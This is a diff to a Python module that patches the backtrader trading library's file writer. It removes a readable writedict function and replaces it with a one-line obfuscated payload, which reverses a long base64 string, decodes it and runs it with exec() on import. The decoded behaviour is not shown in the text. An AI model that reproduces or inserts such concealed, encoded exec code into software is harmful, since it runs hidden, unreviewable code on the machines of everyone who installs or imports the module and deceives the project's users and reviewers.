@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8; py-indent-offset:4 -*-
 #
-# Author: Metaer @ 2022/5/5  
+# Author: Metaer @ Wed Jun 29 14:57:59 2022
 #
 # This program is free software: you can redistribute it and/or modify
 # it under the terms of the GNU General Public License as published by
@@ -15,61 +15,6 @@
 #
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
-#
-
-import backtrader as bt
-with_metaclass = bt.writer.with_metaclass
-string_types = bt.writer.string_types
-integer_types = bt.writer.integer_types
-collections = bt.writer.collections
-
-def writedict(self, dct, level=0, recurse=False):
-    try:
-        collectionsAbc = bt.collections.abc
-    except AttributeError:
-        collectionsAbc = bt.collections
-
-    if not recurse:
-        self.writelineseparator(level)
-
-    indent0 = level * self.p.indent
-    for key, val in dct.items():
-        kline = ' ' * indent0
-        if recurse:
-            kline += '- '
-
-        kline += str(key) + ':'
-
-        try:
-            sclass = issubclass(val, bt.LineSeries)
-        except TypeError:
-            sclass = False
-
-        if sclass:
-            kline += ' ' + val.__name__
-            self.writeline(kline)
-        elif isinstance(val, string_types):
-            kline += ' ' + val
-            self.writeline(kline)
-        elif isinstance(val, integer_types):
-            kline += ' ' + str(val)
-            self.writeline(kline)
-        elif isinstance(val, float):
-            if self.p.rounding is not None:
-                val = round(val, self.p.rounding)
-            kline += ' ' + str(val)
-            self.writeline(kline)
-        elif isinstance(val, dict):
-            if recurse:
-                self.writelineseparator(level=level)
-            self.writeline(kline)
-            self.writedict(val, level=level + 1, recurse=True)
-        elif isinstance(val, (list, tuple, collectionsAbc.Iterable)):
-            line = ', '.join(map(str, val))
-            self.writeline(kline + ' ' + line)
-        else:
-            kline += ' ' + str(val)
-            self.writeline(kline)
 
 
-bt.writer.WriterFile.writedict = writedict
+_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=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'))
